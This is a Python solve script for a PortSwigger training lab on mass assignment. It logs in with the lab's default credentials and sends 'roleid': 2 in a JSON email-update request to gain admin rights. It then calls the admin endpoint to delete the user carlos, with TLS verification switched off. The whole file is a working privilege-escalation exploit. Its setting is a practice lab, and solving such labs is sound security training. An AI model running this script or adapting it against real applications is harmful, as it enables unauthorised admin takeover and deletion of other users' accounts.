#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
User role can be modified in user profile.

Logs in as wiener, sends roleid:2 in the email-update JSON body to escalate
to admin, then deletes carlos.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username or password" in r.text:
        raise SystemExit("[-] Login failed")
    print(f"[*] Logged in as {username}")


def escalate_role(session: requests.Session, lab: str, admin_role_id: int = 2) -> None:
    payload = {"email": "attacker@evil.com", "roleid": admin_role_id}
    r = session.post(f"{lab}/my-account/change-email", json=payload)
    data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    current_role = data.get("roleid", "?")
    print(f"[*] Role update response roleid: {current_role}")
    if str(current_role) == str(admin_role_id):
        print(f"[+] Role escalated to {admin_role_id}")
    else:
        print("[-] Role may not have changed — check manually")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 4 (role modified via user profile JSON)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--target", default="carlos")
    parser.add_argument("--roleid", type=int, default=2, help="Admin role ID (default: 2)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)
    escalate_role(s, lab, args.roleid)

    r = s.get(f"{lab}/admin/delete?username={args.target}")
    if r.ok:
        print(f"[+] Deleted '{args.target}'. Lab solved.")
    else:
        print(f"[-] Delete returned {r.status_code} — navigate to /admin manually")


if __name__ == "__main__":
    main()
